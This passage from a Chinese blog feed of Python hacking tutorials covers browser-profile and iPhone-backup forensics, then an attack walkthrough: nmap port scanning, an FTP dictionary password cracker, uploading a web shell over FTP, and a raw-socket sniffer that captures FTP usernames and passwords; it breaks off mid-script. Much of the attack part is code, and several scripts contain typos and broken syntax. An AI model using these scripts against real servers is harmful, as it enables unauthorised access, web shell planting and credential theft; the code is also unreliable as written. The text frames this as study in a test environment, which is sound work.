class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    parser<span class="token operator">=</span>optparse<span class="token punctuation">.</span>OptionParser<span class="token punctuation">(</span><span class="token string">"usage %prog "</span><span class="token operator">+</span>\        <span class="token string">"-p &lt;firefox profile path>"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'pathName'</span><span class="token punctuation">,</span>type<span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span>\        help<span class="token operator">=</span><span class="token string">'specify skype profile path'</span><span class="token punctuation">)</span>    <span class="token punctuation">(</span>options<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token operator">=</span>parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    pathName<span class="token operator">=</span>options<span class="token punctuation">.</span>pathName    <span class="token keyword">if</span> pathName<span class="token operator">==</span>None<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>parser<span class="token punctuation">.</span>usage<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>pathName<span class="token punctuation">)</span><span class="token operator">==</span><span class="token boolean">False</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[l] Path Dose Not Exist: '</span><span class="token operator">+</span>pathName<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        downloadDB<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>pathName<span class="token punctuation">,</span><span class="token string">'downloads.sqlite'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>downloadDB<span class="token punctuation">)</span><span class="token punctuation">:</span>            printDownloads<span class="token punctuation">(</span>downloadDB<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[l] Downloads DB dose not exist: '</span><span class="token operator">+</span>downloadDB<span class="token punctuation">)</span>        cookiesDB<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>pathName<span class="token punctuation">,</span><span class="token string">'cookies.sqlite'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>cookiesDB<span class="token punctuation">)</span><span class="token punctuation">:</span>            printCookise<span class="token punctuation">(</span>cookiesDB<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[l] Cookies DB does not exist: '</span><span class="token operator">+</span>cookiesDB<span class="token punctuation">)</span>        placesDB<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>pathName<span class="token punctuation">,</span><span class="token string">'places.sqlite'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>placesDB<span class="token punctuation">)</span><span class="token punctuation">:</span>            printHistory<span class="token punctuation">(</span>placesDB<span class="token punctuation">)</span>            printGoogle<span class="token punctuation">(</span>placesDB<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[l] History DB does not exist: '</span><span class="token operator">+</span>placesDB<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n[l] Google DB does not exist: '</span><span class="token operator">+</span>placesDB<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="七、用Python调查iPhone-iPad的iTunes备份"><a href="#七、用Python调查iPhone-iPad的iTunes备份" class="headerlink" title="七、用Python调查iPhone/iPad的iTunes备份"></a>七、用Python调查iPhone/iPad的iTunes备份</h2><ul><li><p>iOS系统跟踪和记录设备的GPS坐标并存储在手机的consolidated.db数据库中，其中的Cell-Location表包含了收集的GPS坐标，并用对最近的基站三角定位获取位置信息，以提高基于位置的服务质量</p></li><li><p>该数据可能会被恶意使用，跟踪iPhone/iPad用户的完整活动路线，电脑上的备份中也含有这些信息</p></li><li><p>iTunes对iPhone或iPad进行备份时，备份目录位于</p><ul><li>C:\Documents and Settings&lt;USERNAME&gt;\Application Data\AppleComputer\MobileSync</li><li>/Users/<username>/Library/Application Support/MobileSync/Backup/ </username></li></ul></li><li><p>为了获得文件更多的信息，用UNIX命令file来提取文件类型，备份目录包含了一些sqlite3数据库，JPEG图像，原始数据和ASCII文本文件<br><img src="https://www.hualigs.cn/image/605d8f07e41f3.jpg" alt=""></p></li><li><p>文件名都是由乱码组成，互不重复</p></li><li><p>在Python中把该目录每个文件当作数据库连接，SQLite数据库中的sqlite_master表存储了数据库的总体架构，连接成功后可从中列举数据库模式 SELECT tbl_name FROM sqlite_master WHERE type==’table’</p></li><li><p>文件d0d7e5fb2ce288813306e4d4636395e047a3d28中有一个名为messages的表，存有短信（Text Message）</p></li><li><p>可扫描目录中的上千文件并确认包含messages表的特定文件</p></li><li><p>定位短信数据库后，可检索短信时间、地址、文本</p></li></ul><p>综合代码iphoneMessages.py从iOS备份中提取短信</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> sqlite3<span class="token keyword">import</span> optparse<span class="token keyword">def</span> <span class="token function">isMessageTable</span><span class="token punctuation">(</span>iphoneDB<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>            conn<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>iphoneDB<span class="token punctuation">)</span>        c<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>'SELECT tbl_name FROM sqlite_master \            WHERE type<span class="token operator">==</span>\"table\"<span class="token punctuation">;</span>'<span class="token punctuation">)</span>        <span class="token keyword">for</span> row <span class="token keyword">in</span> c<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">'message'</span> <span class="token keyword">in</span> str<span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">printMessage</span><span class="token punctuation">(</span>msgDB<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        conn<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>msgDB<span class="token punctuation">)</span>        c<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>'SELECT datatime<span class="token punctuation">(</span>date<span class="token punctuation">,</span>\'unixepoch\'<span class="token punctuation">)</span><span class="token punctuation">,</span>\            address<span class="token punctuation">,</span>text <span class="token keyword">from</span> message WHERE address<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>'<span class="token punctuation">)</span>        <span class="token keyword">for</span> row <span class="token keyword">in</span> c<span class="token punctuation">:</span>            data<span class="token operator">=</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            addr<span class="token operator">=</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            text<span class="token operator">=</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n[+] Date: '</span><span class="token operator">+</span>date<span class="token operator">+</span><span class="token string">', Addr: '</span><span class="token operator">+</span>addr<span class="token operator">+</span><span class="token string">', Message: '</span><span class="token operator">+</span>text<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    parser<span class="token operator">=</span>optparse<span class="token punctuation">.</span>OptionParser<span class="token punctuation">(</span><span class="token string">"usage %prog "</span> <span class="token operator">+</span>\        <span class="token string">"-p &lt;iPhone Backup Directory"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-p,dest=pathName'</span><span class="token punctuation">,</span>\        type<span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'specify skype profile path'</span><span class="token punctuation">)</span>    <span class="token punctuation">(</span>options<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token operator">=</span>parser<span class="token punctuation">.</span>parser_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    pathName<span class="token operator">=</span>options<span class="token punctuation">.</span>pathName    <span class="token keyword">if</span> pathName<span class="token operator">==</span>None<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>parser<span class="token punctuation">.</span>usage<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        dirList<span class="token operator">=</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>pathName<span class="token punctuation">)</span>        <span class="token keyword">for</span> fileName <span class="token keyword">in</span> dirList<span class="token punctuation">:</span>            iphoneDB<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>pathName<span class="token punctuation">,</span>fileName<span class="token punctuation">)</span>            <span class="token keyword">if</span> isMessageTable<span class="token punctuation">(</span>iphoneDB<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n[*] --- Found Messages ---'</span><span class="token punctuation">)</span>                    printMessage<span class="token punctuation">(</span>iphoneDB<span class="token punctuation">)</span>                <span class="token keyword">except</span><span class="token punctuation">:</span>                    <span class="token keyword">pass</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>3/26/2021 3:49:59 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网络攻击</title>
      <link href="2021/03/22/wang-luo-gong-ji/"/>
      <url>2021/03/22/wang-luo-gong-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="一、概要"><a href="#一、概要" class="headerlink" title="一、概要"></a>一、概要</h2><p><img src="https://www.hualigs.cn/image/6058b089c81f1.jpg" alt=""></p><ul><li>利用网络协议漏洞的攻击技术：<ul><li>发动攻击前，首先要进行“踩点”（Foot Printing）。通过DNS查询、Ping、端口扫描等技术，获取目标服务器的操作系统、支持的服务种类、开放的端口等信息</li><li>网络嗅探用于从网络传送的数据包盗取有用信息，常用于局域网（Intranet），利用以太网协议漏洞</li><li>欺骗攻击技术中，黑客伪装服务器地址，从中拦截通信数据包。其中，MAC伪装与IP地址伪装攻击最为常用</li><li>会话劫持技术中，黑客从中拦截客户机与服务器达成的认证会话，从而在无认证状态下实现与服务器通信</li><li>拒绝服务攻击（DoS）通过发送大量正常数据包使服务器瘫痪，或者利用ICMP、HTTP协议漏洞使被攻击系统瘫痪，从而无法继续对外提供服务</li></ul></li></ul><h2 id="二、搭建测试环境"><a href="#二、搭建测试环境" class="headerlink" title="二、搭建测试环境"></a>二、搭建测试环境</h2><ul><li>防火墙需要为Web服务开放80端口与443端口。HTTP协议支持常规Web服务，HTTPS协议支持SSL，用以实现加密通信。有时还需要开放21端口，提供对FTP协议的支持，以实现远程传输文件</li><li>使用端口扫描工具可以查看服务器开放了哪些端口，以及各端口提供的服务。需要特别提出，由于FTP与远程登录服务本身带有安全漏洞，若可以，应设置禁用，以组织用户在外部使用<br><img src="https://www.hualigs.cn/image/6058802437232.jpg" alt=""></li></ul><h2 id="三、使用端口扫描分析漏洞"><a href="#三、使用端口扫描分析漏洞" class="headerlink" title="三、使用端口扫描分析漏洞"></a>三、使用端口扫描分析漏洞</h2><ul><li><p>Python提供了多种模块，可用于对网络进行攻击，其中最具代表性的是scapy和pcapy</p></li><li><p>scapy用途广泛，不仅可以用于端口扫描，还可以用于数据包嗅探等</p></li><li><p>以及Nmap、Wireshark、Metasploit等强大工具</p></li><li><p>信息安全手册建议禁止开放FTP端口，但出于提升速度与管理方便的考虑，一般都会打开FTP端口，以允许应用程序通过FTP端口上传文件，以及管理员由此传送文件</p></li><li><p>利用端口扫描进行攻击的步骤</p><ul><li>安装Nmap(nmap.org)与python nmap(xael.org/norman/python/python-nmap)模块</li><li>端口扫描</li><li>破解密码</li><li>查看Web服务</li><li>上传用于Web shell攻击的脚本</li></ul></li><li><p>端口扫描：从黑客PC向目标PC发送多种协议的数据包，观察目标PC的响应行为</p><ul><li>可以使用的协议由ICMP、TCP、UDP、SCTP等</li><li>Nmap中大量使用的是TCP SYN扫描技术，因其执行非常快，且容易避开安全设备的探测</li><li>非法，要学会 自己搭建测试环境，熟悉Nmap的使用方法，并培养良好的分析能力</li></ul></li><li><p>TCP SYN扫描</p><ul><li>黑客PC向服务器PC特定端口发送TCP SYN数据包时，若目标端口处于服务状态，则向黑客PC发送SYN/ACK数据包。若目标端口关闭，则发送RST数据包</li><li>黑客PC接收来自目标端口的SYN/ACK包后，并不建立完整连接，而向服务器PC发送RST包，然后从中间终止连接</li><li>由于TCP SYN扫描具备这种特点，所以又称“半打开扫描”（Half-open Scanning）<br><img src="https://www.hualigs.cn/image/60588023174ab.jpg" alt=""></li></ul></li></ul><p><strong>例1</strong></p><ul><li>使用TCP SYN扫描方式，从端口1到1024检测哪些端口开放。Python提供了socket模块，使用它可以扫描端口，但它对无响应的端口留有一定的等待时间，所以比较耗时。而使用Nmap模块则能快速检测端口开放与否</li><li>尽量不要使用Nmap工具，在应用程序中通过python nmap间接调用，这样会有更好的扩展性<br><img src="https://www.hualigs.cn/image/6058802448db8.jpg" alt=""></li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> socket<span class="token keyword">import</span> nmap    <span class="token comment" spellcheck="true">#导入nmap模块，以使用python nmap模块</span><span class="token triple-quoted-string string">'''创建PortScanner对象，以使用nmap。若尚未安装Nmap，则会触发PortScanner异常'''</span>nm<span class="token operator">=</span>nmap<span class="token punctuation">.</span>PortScanner<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''运行端口扫描：接收2-3个参数    主机：使用类似于scanme.nmap.org、198.116.0-255.1-127等    端口：使用类似于22,53,110,143-4564的形式，设置要扫描的端口范围    参数：使用类似于 -sU -sX -sC的形式，设置运行Nmap所需选项'''</span>nm<span class="token punctuation">.</span>scan<span class="token punctuation">(</span><span class="token string">'server'</span><span class="token punctuation">,</span><span class="token string">'1-1024'</span><span class="token punctuation">)</span><span class="token keyword">for</span> host <span class="token keyword">in</span> nm<span class="token punctuation">.</span>all_hosts<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#获取主机列表，以列表形式返回</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'----------------------'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Host : {0} ( {1} )'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>host<span class="token punctuation">,</span>nm<span class="token punctuation">[</span>host<span class="token punctuation">]</span><span class="token punctuation">.</span>hostname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'State : {0}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>nm<span class="token punctuation">[</span>host<span class="token punctuation">]</span><span class="token punctuation">.</span>state<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出主机状态</span>    <span class="token keyword">for</span> proto <span class="token keyword">in</span> nm<span class="token punctuation">[</span>host<span class="token punctuation">]</span><span class="token punctuation">.</span>all_protocols<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#以列表形式显示主机中扫描的所有端口</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Protocol : {0}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>proto<span class="token punctuation">)</span><span class="token punctuation">)</span>        lport<span class="token operator">=</span>list<span class="token punctuation">(</span>nm<span class="token punctuation">[</span>host<span class="token punctuation">]</span><span class="token punctuation">[</span>proto<span class="token punctuation">]</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            lport<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> port <span class="token keyword">in</span> lport<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'port : {0} \t state : {1}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>port<span class="token punctuation">,</span>nm<span class="token punctuation">[</span>host<span class="token punctuation">]</span><span class="token punctuation">[</span>proto<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-----------------------'</span><span class="token punctuation">)</span></code></pre><ul><li>端口扫描结果<ul><li>获取了防火墙中开放的主机、端口信息，以及相关的应用程序信息<br><img src="https://www.hualigs.cn/image/605880240f9f3.jpg" alt=""></li></ul></li></ul><p><strong>例2</strong></p><ul><li>破解FTP密码<ul><li>利用FTP服务（21端口）破解并获取管理员密码</li><li>FTP服务后台设置中，通常不检查密码输错次数</li><li>可利用sqlmap提供的wordlist字典，不断尝试猜密码</li><li>ftplib模块提供了灵活使用FTP服务的多种功能<br><img src="https://www.hualigs.cn/image/605880244739b.jpg" alt=""></li></ul></li></ul><pre class=" language-python"><code class="language-python">ftom ftplib <span class="token keyword">import</span> FTPwordlist<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'wordlist.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>user_login<span class="token operator">=</span><span class="token string">"server"</span><span class="token triple-quoted-string string">'''声明getPassword函数，用于连接FTP Connection到服务器，并尝试登录'''</span><span class="token keyword">def</span> <span class="token function">getPassword</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        ftp<span class="token operator">=</span>FTP<span class="token punctuation">(</span><span class="token string">"server"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#连接FTP Connection到服务器，参数为IP或域名</span>        <span class="token triple-quoted-string string">'''        登录：使用函数参数给出的密码与已知用户名尝试登录，若登录正常，则执行下一段代码        '''</span>        ftp<span class="token punctuation">.</span>login<span class="token punctuation">(</span>user_login<span class="token punctuation">,</span>password<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"user password:"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    exception Exception<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>passwords<span class="token operator">=</span>wordlist<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> password <span class="token keyword">in</span> passwords<span class="token punctuation">:</span>    password<span class="token operator">=</span>password<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"test password:"</span><span class="token punctuation">,</span>password    <span class="token triple-quoted-string string">'''    调用getPassword函数，从wordlist.txt文件逐个读取密码，作为参数传递给getPassword()函数    '''</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>getPassword<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>wordlist<span class="token punctuation">.</span>clost<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li><p>FTP密码破解结果<br><img src="https://www.hualigs.cn/image/6058802423313.jpg" alt=""></p></li><li><p>若一个系统不限制密码输错次数，则很容易成为密码破解攻击的目标。为了阻止密码破解攻击，必须在系统唤醒设置或安装的安全设备（防火墙、IPS、IDS）中对此进行相应处理。请尽量少用或者不用FTP，即使使用，也要利用Secure FTP等安全协议</p></li></ul><p><strong>例3</strong></p><ul><li>访问目录列表哦<ul><li>ftplib模块提供了nlst()函数，获取参数文件夹下的文件名称列表，python程序可借此访问指定目录</li><li>若不特别设置，Apache会将Web应用程序保存到htdoc目录<br><img src="https://www.hualigs.cn/image/605880242a374.jpg" alt=""></li></ul></li></ul><p><strong>例4</strong></p><ul><li>FTP Web shell攻击<ul><li>Web shell攻击中，上传文件的扩展名会受限制</li><li>FTP却可以直接上传各种格式文件</li><li>在网上可以轻松找到各种功能强大的Web shell文件（“几种好用的经典webshell(php)”）<br><img src="https://www.hualigs.cn/image/60588022eeaec.jpg" alt=""></li></ul></li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ftplib <span class="token keyword">import</span> FTPapacheDir<span class="token operator">=</span><span class="token string">"htdocs"</span>serverName<span class="token operator">=</span><span class="token string">"server"</span>serverID<span class="token operator">=</span><span class="token string">"server"</span>serverPW<span class="token operator">=</span><span class="token string">"server"</span>ftp<span class="token operator">=</span>FTP<span class="token punctuation">(</span>serverName<span class="token punctuation">,</span>serverID<span class="token punctuation">,</span>serverPW<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#登录FTP</span>fp<span class="token punctuation">.</span>cwd<span class="token punctuation">(</span><span class="token string">"APM_Setup/htdocs"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#更改目录：转到Web服务安装目录</span>fp<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">"webshell.php"</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#打开文件，打开含有Web shell功能的PHP文件</span>ftp<span class="token punctuation">.</span>storbinary<span class="token punctuation">(</span>"STOR webshell<span class="token punctuation">.</span>php<span class="token punctuation">,</span>fp<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#传送文件：向服务器的Web服务安装目录传送文件</span>fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>ftp<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li>文件上传后，打开浏览器，发动Web shell攻击。在地址栏输入<a href="http://server/webshell.php" target="_blank" rel="noopener">http://server/webshell.php</a></li></ul><h2 id="四、使用包嗅探技术盗取认证信息"><a href="#四、使用包嗅探技术盗取认证信息" class="headerlink" title="四、使用包嗅探技术盗取认证信息"></a>四、使用包嗅探技术盗取认证信息</h2><ul><li><p>使用密码破解技术获取认证信息时，需要不断输入用户名和密码，这一过程相当耗时。并且，如果数据字典中不存在相匹配的密码，破解就会失败</p></li><li><p>TCP/IP网络中的数据在传输过程中有可能被盗取。假设渗透测试成功，成功将内部计算机变为僵尸PC（“肉鸡”）。侵入内网后，即可获取内网传送的数据包</p></li><li><p>特别是在FTP登录中，由于用户名与密码都是以明文传送的，所以很容易使用包嗅探技术进行窃取。虽然传输层的数据需要经过变换才能识读，但应用层的FTP数据不需要特别处理即可识别<br><img src="https://www.hualigs.cn/image/6058802431c34.jpg" alt=""></p></li><li><p>嗅探 sniff</p><ul><li>嗅探器可以窃听网络上流经的数据包，分析数据，获取信息</li><li>由于网络是依据路由器进行分割的，所以只有连接到同一路由器（同网段）的节点才能彼此交互数据包</li><li>用集线器hub组建的网络是基于共享的原理的，局域网内所有的计算机都接收相同的数据包，而网卡构造了硬件的“过滤器”通过识别MAC地址过滤掉和自己无关的信息，嗅探程序只需关闭这个过滤器，将网卡设置为“混杂模式”就可以进行嗅探</li><li>用交换机switch组建的网络是基于“交换”原理的，交换机不是把数据包发到所有的端口上，而是发到目的网卡所在的端口，这样嗅探起来会麻烦一些，嗅探程序一般利用“ARP欺骗”的方法，通过改变MAC地址等手段，欺骗交换机将数据包发给自己，嗅探分析完毕再转发出去</li></ul></li><li><p>包嗅探步骤</p><ul><li>要创建包嗅探程序，需要以管理员权限安装Python GUI</li><li>程序创建原始套接字时，需要拥有管理员权限</li><li>原始套接字支持原样接收基本包功能，不会应用协议过滤</li><li>创建原始套接字后，将其绑定到NIC，切换NIC模式。默认设置下，NIC只接收目的地址为自身的包，而将模式更改为Promiscuous后，所有进入NIC的包都会被接收</li><li>例5不分析各层数据包，而是学习通过包嗅探获取用户名与密码的方法，所以只分析应用层数据</li></ul></li></ul><p><strong>例5</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> stringHOST<span class="token operator">=</span>socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#byname：根据机器名获取IP</span><span class="token triple-quoted-string string">'''创建套接字类型：传递3个参数，定义套接字功能，创建类    AF_INET：指定协议族为支持TCP/UDP的IPv4协议    SOCK_RAW：支持原始套接字。原始套接字负责在IP栈之上发送或接收协议，而不需TCP/UDP的IPv4协议    IPPROTO_IP：将套接字中要使用的协议设置为IP协议'''</span>s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">,</span>SOCK_RAW<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>IPPROTO_IP<span class="token punctuation">)</span>s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#绑定套接字：将套接字绑定到NIC，地址为本地PC的地址，由系统指定端口</span><span class="token triple-quoted-string string">'''更改套接字选项：更改选项，以向内核输入RAW包IPPROTO_IP：表示套接字向内核输入网络层包IP_HDRINCL，1：表示套接字同时向内核提供IP头'''</span>s<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>IPPROTO_IP<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>IP_HDRINCL<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''设置Promiscuous模式：该模式使NIC将接收的所有包都传递给套接字SIO_RCVALL：该设置将NIC接收的所有IPv4/IPv6包都传递给套接字RCVALL_ON：该设置下，NIC接收的所有包都不丢弃，均传给套接字'''</span>s<span class="token punctuation">.</span>ioctl<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SIO_RCVALL<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>RCVALL_ON<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    data<span class="token operator">=</span>s<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span><span class="token number">65565</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#接收包：从缓冲读取65565字节(64K)数据，以元组形式</span>    printable<span class="token operator">=</span>set<span class="token punctuation">(</span>string<span class="token punctuation">.</span>printable<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#设置输出格式</span>    parseData<span class="token operator">=</span><span class="token string">".join(x if x in printable else '.' for x in data[0])"</span>    <span class="token triple-quoted-string string">'''    输出认证信息：输出数据中的认证信息，USER与PASS分别对应用户名与密码    认证成功时，输出530信息；失败时，输出230信息。可在此查看准确的认证信息    '''</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>parseData<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"USER"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> parseData    <span class="token keyword">elif</span><span class="token punctuation">(</span>parseData<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"PASS"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> parseData    <span class="token keyword">elif</span><span class="token punctuation">(</span>parseData<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"530 User cannot log 